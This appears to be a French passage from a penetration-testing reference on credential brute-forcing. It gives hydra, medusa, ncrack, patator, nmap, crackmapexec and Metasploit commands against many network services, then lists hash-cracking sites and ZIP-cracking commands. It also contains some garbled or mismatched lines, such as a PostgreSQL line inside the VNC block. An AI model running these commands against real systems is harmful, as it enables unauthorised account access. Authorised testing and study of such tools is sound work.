Dans le contexte d'OracleSQL, la force brute peut être utilisée pour tenter de deviner les mots de passe des utilisateurs d'une base de données Oracle. Cela peut être fait en utilisant des outils automatisés qui génèrent et testent des combinaisons de mots de passe, ou en écrivant un script personnalisé pour effectuer cette tâche.

Il est important de noter que la force brute est une méthode très lente et peut prendre beaucoup de temps, en fonction de la complexité du mot de passe. De plus, l'utilisation de la force brute pour accéder à un système sans autorisation est illégale et peut entraîner des conséquences juridiques graves.

Il est recommandé d'utiliser des méthodes légales et éthiques, telles que l'obtention d'autorisations appropriées et la réalisation de tests de pénétration, pour évaluer la sécurité d'un système OracleSQL.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
Pour utiliser **oracle_login** avec **patator**, vous devez **installer** :
```bash
pip3 install cx_Oracle --upgrade
```
[Bruteforce du hash OracleSQL hors ligne](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** et **11.2.0.3**) :
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

Le protocole POP (Post Office Protocol) est un protocole utilisé pour récupérer les e-mails à partir d'un serveur de messagerie. Il est couramment utilisé pour accéder aux boîtes aux lettres électroniques à l'aide de clients de messagerie tels que Outlook, Thunderbird, etc.

#### Méthodologie de force brute

La méthode de force brute est une technique utilisée pour tenter toutes les combinaisons possibles de mots de passe jusqu'à ce que le mot de passe correct soit trouvé. Dans le contexte de l'accès POP, la méthode de force brute peut être utilisée pour essayer de deviner le mot de passe d'une boîte aux lettres électronique.

Voici les étapes générales pour effectuer une attaque de force brute sur un serveur POP :

1. Identifier le serveur POP cible.
2. Utiliser un outil de force brute pour générer toutes les combinaisons possibles de mots de passe.
3. Envoyer chaque combinaison de mot de passe au serveur POP pour vérification.
4. Répéter les étapes 2 et 3 jusqu'à ce que le mot de passe correct soit trouvé.

Il est important de noter que la méthode de force brute peut être très lente et nécessite beaucoup de ressources de calcul. De plus, de nombreux serveurs POP ont des mécanismes de sécurité en place pour détecter et bloquer les attaques de force brute, ce qui rend cette méthode moins efficace.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL est un système de gestion de base de données relationnelle open source et puissant. Il est largement utilisé dans les applications web et est connu pour sa fiabilité, sa robustesse et sa conformité aux normes SQL.

Lorsqu'il s'agit de pirater une base de données PostgreSQL, l'une des méthodes les plus couramment utilisées est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe jusqu'à ce que la bonne combinaison soit trouvée.

Pour mener une attaque par force brute contre une base de données PostgreSQL, vous pouvez utiliser des outils tels que Hydra, Medusa ou Metasploit. Ces outils automatisent le processus en testant rapidement différentes combinaisons de noms d'utilisateur et de mots de passe.

Il est important de noter que l'attaque par force brute est une méthode d'attaque lente et bruyante, qui peut être détectée par les systèmes de détection d'intrusion. Par conséquent, il est recommandé de prendre des mesures pour renforcer la sécurité de votre base de données PostgreSQL, telles que l'utilisation de mots de passe forts, la limitation des tentatives de connexion et la mise en place de mécanismes de verrouillage automatique en cas de tentatives d'attaque répétées.

En conclusion, PostgreSQL est un système de gestion de base de données populaire et puissant, mais il est important de prendre des mesures pour protéger votre base de données contre les attaques par force brute et autres techniques de piratage.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

Vous pouvez télécharger le package `.deb` à installer depuis [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) est un protocole de communication utilisé pour accéder à distance à un ordinateur. Il permet à un utilisateur de se connecter à un ordinateur distant et d'interagir avec lui comme s'il était physiquement présent devant lui.

Le brute-forcing RDP est une technique utilisée pour tenter de deviner les identifiants de connexion RDP en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Cette méthode est souvent utilisée par les attaquants pour accéder illégalement à des systèmes distants.

Il existe plusieurs outils disponibles pour effectuer des attaques de brute-forcing RDP, tels que Hydra, Medusa et Crowbar. Ces outils automatisent le processus de tentative de connexion en utilisant une liste de noms d'utilisateur et de mots de passe préalablement collectés ou générés.

Il est important de noter que le brute-forcing RDP est une activité illégale, sauf si elle est effectuée dans le cadre d'un test d'intrusion autorisé. Les professionnels de la sécurité utilisent cette technique pour évaluer la sécurité des systèmes et identifier les vulnérabilités potentielles.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
### Redis

Redis est une base de données en mémoire open-source qui peut être utilisée comme cache, système de messagerie et stockage de données clé-valeur. Il est connu pour sa haute performance et sa simplicité d'utilisation.

#### Attaque par force brute

L'attaque par force brute est une technique utilisée pour tenter de deviner un mot de passe ou une clé en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque les autres méthodes d'attaque, telles que l'ingénierie sociale ou l'exploitation de vulnérabilités, ne sont pas efficaces.

Dans le contexte de Redis, une attaque par force brute peut être utilisée pour tenter de deviner le mot de passe d'un serveur Redis protégé par mot de passe. L'attaquant essaiera différentes combinaisons de mots de passe jusqu'à ce qu'il trouve le bon. Cette attaque peut être automatisée à l'aide d'outils spécifiques, tels que Hydra ou Medusa.

Pour se protéger contre les attaques par force brute, il est recommandé de choisir un mot de passe fort et complexe pour le serveur Redis. De plus, il est conseillé de limiter l'accès au serveur en utilisant des listes de contrôle d'accès (ACL) ou en configurant un pare-feu pour restreindre les connexions entrantes.

Il est également important de surveiller les journaux d'activité du serveur Redis pour détecter toute activité suspecte ou tentative d'attaque par force brute. En cas de tentative d'attaque, des mesures de sécurité supplémentaires, telles que le blocage de l'adresse IP de l'attaquant, peuvent être prises pour renforcer la sécurité du serveur Redis.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Le protocole Rexec (Remote Execution) est un protocole de communication utilisé pour exécuter des commandes à distance sur un système distant. Il permet à un utilisateur distant de se connecter à un serveur distant et d'exécuter des commandes sur ce serveur en utilisant son propre compte d'utilisateur.

Le protocole Rexec utilise généralement le port 512 pour la communication. Lorsqu'un utilisateur se connecte à un serveur distant via Rexec, il est invité à fournir ses informations d'identification (nom d'utilisateur et mot de passe) pour s'authentifier.

Une fois authentifié, l'utilisateur peut exécuter des commandes sur le serveur distant. Cependant, il convient de noter que le protocole Rexec n'offre pas de chiffrement des données, ce qui signifie que toutes les informations transmises entre l'utilisateur et le serveur sont envoyées en clair. Par conséquent, il est recommandé d'utiliser des méthodes de chiffrement supplémentaires, telles que SSH, pour sécuriser la communication lors de l'utilisation du protocole Rexec.

Le protocole Rexec peut être utilisé de manière malveillante par des attaquants pour exécuter des commandes non autorisées sur un système distant. Par conséquent, il est important de sécuriser les serveurs en désactivant le protocole Rexec ou en limitant son accès aux utilisateurs autorisés uniquement.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Le protocole Rlogin (Remote Login) est un protocole de communication utilisé pour se connecter à distance à un système Unix. Il permet aux utilisateurs d'accéder à une machine distante et d'exécuter des commandes à partir de leur propre terminal.

Le protocole Rlogin utilise un mécanisme d'authentification basé sur un nom d'utilisateur et un mot de passe. Cependant, il est connu pour être vulnérable aux attaques par force brute, où un attaquant tente de deviner le mot de passe en essayant différentes combinaisons.

Les attaques par force brute contre le protocole Rlogin peuvent être effectuées à l'aide d'outils spécifiques, tels que Hydra ou Medusa, qui automatisent le processus de deviner les mots de passe en testant différentes combinaisons à grande vitesse.

Pour se protéger contre les attaques par force brute, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts et uniques pour chaque compte utilisateur.
- Mettre en place des politiques de verrouillage de compte après un certain nombre de tentatives de connexion infructueuses.
- Utiliser des outils de détection d'intrusion pour surveiller les tentatives d'attaques par force brute.
- Mettre en place des pare-feu pour limiter l'accès au protocole Rlogin depuis des adresses IP spécifiques.

En suivant ces bonnes pratiques de sécurité, vous pouvez réduire considérablement les risques d'attaques par force brute contre le protocole Rlogin.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Le Rsh (Remote Shell) est un protocole de communication qui permet d'exécuter des commandes sur des machines distantes. Il est souvent utilisé pour l'administration à distance des systèmes Unix. Cependant, en raison de ses vulnérabilités de sécurité, il est généralement déconseillé d'utiliser le Rsh.

L'une des attaques les plus courantes utilisant le Rsh est l'attaque par force brute. Cette attaque consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le mot de passe correct soit trouvé. Les attaquants utilisent souvent des dictionnaires de mots de passe pour automatiser ce processus.

Pour se protéger contre les attaques par force brute utilisant le Rsh, il est recommandé de désactiver le service Rsh sur les machines distantes. De plus, il est important d'utiliser des mots de passe forts et de mettre en place des politiques de verrouillage des comptes après un certain nombre de tentatives infructueuses.

En résumé, le Rsh est un protocole de communication à distance qui présente des vulnérabilités de sécurité, notamment en ce qui concerne les attaques par force brute. Il est donc préférable de désactiver ce service et de prendre des mesures de sécurité appropriées pour protéger les systèmes.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync est un outil de synchronisation de fichiers qui permet de copier et de synchroniser des données entre des systèmes distants. Il est largement utilisé dans les environnements de sauvegarde et de transfert de fichiers. Rsync utilise un algorithme de transfert de données efficace qui ne transfère que les parties modifiées des fichiers, ce qui permet de réduire considérablement le temps et la bande passante nécessaires pour effectuer la synchronisation.

Cependant, Rsync peut également être utilisé comme une méthode de brute force pour tenter de deviner des mots de passe. En utilisant l'option `--password-file`, vous pouvez spécifier un fichier contenant une liste de mots de passe à essayer. Rsync essaiera chaque mot de passe de la liste jusqu'à ce qu'il trouve le bon. Cette méthode peut être utilisée pour tenter de deviner des mots de passe faibles ou des mots de passe par défaut sur des systèmes distants.

Il est important de noter que l'utilisation de la méthode de brute force pour tenter de deviner des mots de passe est illégale sans autorisation appropriée. Elle est généralement utilisée dans le cadre de tests de pénétration légaux ou d'audits de sécurité autorisés.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

Le protocole RTSP (Real Time Streaming Protocol) est un protocole de communication utilisé pour le streaming en temps réel de données multimédias, telles que l'audio et la vidéo, sur des réseaux IP. Il permet aux clients de contrôler la lecture des médias, tels que la lecture, la pause, l'avance rapide et le retour en arrière, en communiquant avec le serveur de streaming.

Le protocole RTSP utilise généralement le port 554 pour la communication. Il fonctionne en établissant une session entre le client et le serveur, où le client envoie des commandes RTSP pour contrôler la lecture des médias. Le serveur répond ensuite avec des réponses RTSP pour indiquer l'état de la lecture ou pour effectuer des actions demandées par le client.

L'une des méthodes couramment utilisées pour attaquer les serveurs RTSP est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe pour accéder au serveur. Les attaquants utilisent souvent des dictionnaires de mots de passe couramment utilisés ou génèrent des combinaisons aléatoires pour tenter de trouver des identifiants valides.

Pour se protéger contre les attaques par force brute, il est recommandé d'utiliser des mots de passe forts et uniques pour les serveurs RTSP. De plus, la mise en place de mécanismes de verrouillage après un certain nombre de tentatives infructueuses peut également aider à prévenir les attaques par force brute.

Il est important de noter que l'attaque par force brute est une activité illégale et non éthique, et son utilisation est strictement interdite sans autorisation appropriée.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

Le protocole SNMP (Simple Network Management Protocol) est un protocole largement utilisé pour la gestion et la surveillance des réseaux. Il permet aux administrateurs réseau de collecter des informations sur les périphériques réseau, tels que les routeurs, les commutateurs et les serveurs, ainsi que de configurer et de contrôler ces périphériques à distance.

Le SNMP utilise un modèle de gestion basé sur des agents et des gestionnaires. Les agents SNMP sont des logiciels installés sur les périphériques réseau qui collectent et stockent des informations sur l'état et les performances du périphérique. Les gestionnaires SNMP sont des applications qui se connectent aux agents SNMP pour récupérer et analyser les informations collectées.

L'une des méthodes couramment utilisées pour attaquer les systèmes SNMP est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe pour accéder à un périphérique SNMP. Les attaquants utilisent souvent des dictionnaires de mots de passe préalablement compilés pour automatiser le processus de force brute.

Pour se protéger contre les attaques par force brute SNMP, il est recommandé de prendre les mesures suivantes :

- Utiliser des noms d'utilisateur et des mots de passe forts et uniques pour les périphériques SNMP.
- Limiter l'accès SNMP aux adresses IP autorisées uniquement.
- Mettre en place des mécanismes de détection d'intrusion pour surveiller les tentatives d'attaque par force brute.
- Mettre à jour régulièrement les périphériques SNMP avec les derniers correctifs de sécurité.

En suivant ces bonnes pratiques de sécurité, les administrateurs réseau peuvent réduire considérablement les risques d'attaque par force brute SNMP et protéger leurs réseaux contre les intrusions non autorisées.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) est un protocole de partage de fichiers et d'impression utilisé par les systèmes d'exploitation Windows. Il permet aux utilisateurs d'accéder et de partager des fichiers et des imprimantes sur un réseau local. Cependant, en raison de certaines vulnérabilités, SMB peut être exploité par des attaquants pour accéder illégalement à des ressources réseau.

L'une des méthodes couramment utilisées pour attaquer SMB est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe jusqu'à ce que la bonne combinaison soit trouvée. Les attaquants utilisent souvent des outils automatisés pour effectuer cette attaque, ce qui leur permet de tester rapidement de nombreuses combinaisons.

Pour se protéger contre les attaques par force brute sur SMB, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts : choisissez des mots de passe longs et complexes, comprenant des lettres majuscules et minuscules, des chiffres et des caractères spéciaux.
- Limiter les tentatives de connexion : configurez votre système pour bloquer temporairement les adresses IP après un certain nombre de tentatives de connexion infructueuses.
- Mettre à jour régulièrement : assurez-vous que votre système d'exploitation et vos logiciels sont à jour avec les derniers correctifs de sécurité pour éviter les vulnérabilités connues.

En suivant ces bonnes pratiques, vous pouvez renforcer la sécurité de votre réseau et réduire les risques d'attaque par force brute sur SMB.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

Le protocole SMTP (Simple Mail Transfer Protocol) est un protocole de communication utilisé pour l'envoi de courriers électroniques sur Internet. Il est couramment utilisé par les serveurs de messagerie pour transférer les courriers électroniques d'un serveur à un autre.

#### Attaque par force brute SMTP

L'attaque par force brute SMTP est une technique utilisée pour tenter de deviner les identifiants de connexion d'un serveur de messagerie en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Cette attaque peut être réalisée à l'aide d'outils automatisés qui testent de manière répétée différentes combinaisons jusqu'à ce qu'une correspondance réussie soit trouvée.

#### Méthodologie de l'attaque par force brute SMTP

1. Collecte d'informations : La première étape consiste à collecter des informations sur la cible, telles que l'adresse IP du serveur de messagerie, le nom de domaine, les noms d'utilisateur couramment utilisés, etc.

2. Sélection de l'outil : Choisissez un outil d'attaque par force brute SMTP, tel que Hydra ou Medusa, pour effectuer l'attaque.

3. Configuration de l'outil : Configurez l'outil en spécifiant l'adresse IP du serveur de messagerie cible, les noms d'utilisateur à tester et les listes de mots de passe à utiliser.

4. Lancement de l'attaque : Lancez l'attaque en exécutant l'outil avec les paramètres configurés. L'outil tentera différentes combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce qu'une correspondance réussie soit trouvée.

5. Analyse des résultats : Analysez les résultats de l'attaque pour identifier les identifiants de connexion valides. Ces informations peuvent être utilisées pour accéder au serveur de messagerie cible.

#### Contre-mesures

Pour se protéger contre les attaques par force brute SMTP, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts : Utilisez des mots de passe complexes et uniques pour les comptes de messagerie afin de rendre plus difficile leur devinette.

- Limiter les tentatives de connexion : Mettez en place des mécanismes de verrouillage de compte ou de limitation des tentatives de connexion pour empêcher les attaquants de tester de manière répétée différentes combinaisons.

- Surveillance des journaux : Surveillez les journaux du serveur de messagerie pour détecter toute activité suspecte ou des tentatives d'attaque par force brute.

- Mise à jour du serveur de messagerie : Assurez-vous que le serveur de messagerie est régulièrement mis à jour avec les derniers correctifs de sécurité pour réduire les vulnérabilités potentielles.

En suivant ces contre-mesures, vous pouvez renforcer la sécurité de votre serveur de messagerie et réduire les risques d'attaque par force brute SMTP.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS (Socket Secure) est un protocole de réseau qui permet aux utilisateurs d'établir une connexion sécurisée à travers un pare-feu ou un proxy. Il est couramment utilisé pour contourner les restrictions de réseau et accéder à des ressources en ligne restreintes.

L'attaque par force brute SOCKS consiste à essayer toutes les combinaisons possibles de mots de passe pour accéder à un serveur SOCKS. Cette méthode est souvent utilisée lorsque le serveur ne limite pas le nombre de tentatives de connexion ou lorsque les mots de passe sont faibles et faciles à deviner.

Pour mener une attaque par force brute SOCKS, vous pouvez utiliser des outils tels que Hydra ou Medusa, qui automatisent le processus de test de toutes les combinaisons de mots de passe. Ces outils peuvent être configurés pour utiliser une liste de mots de passe courants ou générer des mots de passe aléatoires.

Il est important de noter que l'attaque par force brute SOCKS est une activité illégale et non éthique, sauf si elle est effectuée dans le cadre d'un test de pénétration autorisé. L'utilisation de cette méthode sans autorisation peut entraîner des conséquences juridiques graves.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH (Secure Shell) est un protocole de réseau sécurisé qui permet d'établir une connexion cryptée entre un client et un serveur. Il est couramment utilisé pour l'accès à distance aux systèmes Unix et Linux. SSH utilise une paire de clés (une clé privée et une clé publique) pour authentifier le client et le serveur, et chiffre toutes les données échangées entre eux.

#### Brute Force SSH

La méthode de force brute SSH est une technique utilisée pour tenter de deviner les informations d'identification d'un compte SSH en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Cette méthode est souvent utilisée par les attaquants pour accéder illégalement à des systèmes distants.

Pour effectuer une attaque de force brute SSH, un attaquant utilise un programme automatisé qui tente de se connecter au serveur SSH en utilisant une liste de noms d'utilisateur et de mots de passe préalablement collectés ou générés. L'attaquant peut également utiliser des dictionnaires de mots de passe couramment utilisés ou des techniques de génération de mots de passe pour augmenter les chances de succès.

Il est important de noter que la méthode de force brute SSH est une attaque très lente et bruyante, car elle nécessite de nombreuses tentatives de connexion. Les serveurs SSH sont généralement configurés pour détecter et bloquer les tentatives de connexion répétées, ce qui rend cette méthode moins efficace.

Pour se protéger contre les attaques de force brute SSH, il est recommandé de prendre les mesures suivantes :

- Utiliser des noms d'utilisateur et des mots de passe forts et uniques pour les comptes SSH.
- Configurer le serveur SSH pour limiter le nombre de tentatives de connexion autorisées avant de bloquer l'adresse IP de l'attaquant.
- Utiliser des clés SSH au lieu de mots de passe pour l'authentification.
- Mettre en place un système de détection d'intrusion pour surveiller les tentatives de connexion suspectes.
- Mettre à jour régulièrement le logiciel SSH pour bénéficier des dernières corrections de sécurité.

En suivant ces bonnes pratiques, vous pouvez renforcer la sécurité de votre serveur SSH et réduire les risques d'attaque par force brute.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### Clés SSH faibles / PRNG prévisible de Debian

Certains systèmes présentent des failles connues dans la graine aléatoire utilisée pour générer du matériel cryptographique. Cela peut entraîner une réduction considérable de l'espace des clés, qui peut être soumis à une attaque par force brute à l'aide d'outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles prégénérés de clés faibles sont également disponibles, tels que [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### Serveur SQL
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
Telnet is a protocol used for remote access to computers over a network. It allows users to log in to a remote system and execute commands as if they were directly connected to it. Telnet is often used for administrative purposes, such as configuring network devices or troubleshooting issues.

However, Telnet is considered to be insecure because it transmits data, including usernames and passwords, in plain text. This means that an attacker who can intercept the network traffic can easily capture sensitive information.

One common method used to exploit Telnet is brute force attacks. In a brute force attack, an attacker systematically tries all possible combinations of usernames and passwords until the correct one is found. This can be done manually or with the help of automated tools.

To protect against brute force attacks on Telnet, it is recommended to disable Telnet and use more secure alternatives, such as SSH (Secure Shell). SSH encrypts the data transmitted between the client and the server, making it much more difficult for an attacker to intercept and decipher the information.

In conclusion, Telnet is a protocol that allows remote access to computers, but it is insecure due to its lack of encryption. Brute force attacks are a common method used to exploit Telnet, but they can be mitigated by disabling Telnet and using more secure alternatives like SSH.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC (Virtual Network Computing) est un protocole qui permet d'accéder et de contrôler à distance un ordinateur. Il est souvent utilisé pour l'administration à distance, le support technique et la collaboration. Le protocole VNC fonctionne en transmettant les images de l'écran de l'ordinateur distant vers l'ordinateur local, et en envoyant les entrées de l'ordinateur local vers l'ordinateur distant.

#### Brute-Force sur VNC

Le brute-force est une technique couramment utilisée pour tenter de deviner les mots de passe d'un compte VNC. Cette méthode consiste à essayer différentes combinaisons de mots de passe jusqu'à ce que le bon soit trouvé. Les attaquants utilisent souvent des dictionnaires de mots de passe couramment utilisés ou génèrent des combinaisons aléatoires pour effectuer une attaque brute-force.

Pour mener une attaque brute-force sur VNC, vous pouvez utiliser des outils tels que Hydra, Medusa ou Ncrack. Ces outils automatisent le processus de tentative de connexion avec différentes combinaisons de mots de passe. Il est important de noter que le brute-force est une méthode lente et peut prendre beaucoup de temps, en fonction de la complexité du mot de passe.

Pour se protéger contre les attaques brute-force sur VNC, il est recommandé d'utiliser des mots de passe forts et uniques pour chaque compte VNC. Il est également conseillé de limiter l'accès à VNC en utilisant des pare-feu ou en configurant des règles d'accès restreintes.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) est un protocole de gestion à distance pour les systèmes d'exploitation Windows. Il permet aux administrateurs de contrôler et de gérer à distance des machines Windows via une interface en ligne de commande.

L'attaque par force brute est une technique couramment utilisée pour tenter de deviner les mots de passe d'un compte Winrm. Cette méthode consiste à essayer différentes combinaisons de mots de passe jusqu'à ce que le bon soit trouvé. Les attaquants utilisent souvent des dictionnaires de mots de passe couramment utilisés ou génèrent des mots de passe aléatoires pour mener cette attaque.

Il est important de noter que l'attaque par force brute peut être une méthode lente et consommatrice de ressources, car elle nécessite de tester de nombreuses combinaisons de mots de passe. De plus, les systèmes de sécurité peuvent détecter et bloquer les tentatives d'attaque par force brute, ce qui rend cette méthode moins efficace.

Pour se protéger contre les attaques par force brute, il est recommandé d'utiliser des mots de passe forts et uniques pour les comptes Winrm. Il est également conseillé de mettre en place des mesures de sécurité supplémentaires, telles que le verrouillage du compte après un certain nombre de tentatives infructueuses de connexion.

En résumé, Winrm est un protocole de gestion à distance pour les systèmes Windows, et l'attaque par force brute est une méthode courante utilisée pour tenter de deviner les mots de passe des comptes Winrm. Il est important de prendre des mesures de sécurité appropriées pour se protéger contre cette attaque.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Local

### Bases de données de craquage en ligne

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 et SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 avec/sans ESS/SSP et avec n'importe quelle valeur de challenge)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, captures WPA2 et archives MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes et hash de fichiers)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Vérifiez cela avant d'essayer de forcer un hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Attaque par force brute avec texte en clair connu

Vous devez connaître le **texte en clair** (ou une partie du texte en clair) **d'un fichier contenu à l'intérieur** du fichier zip chiffré. Vous pouvez vérifier les **noms de fichiers et la taille des fichiers contenus à l'intérieur** d'un fichier zip chiffré en exécutant la commande suivante : **`7z l encrypted.zip`**\
Téléchargez [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) depuis la page des versions publiées.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
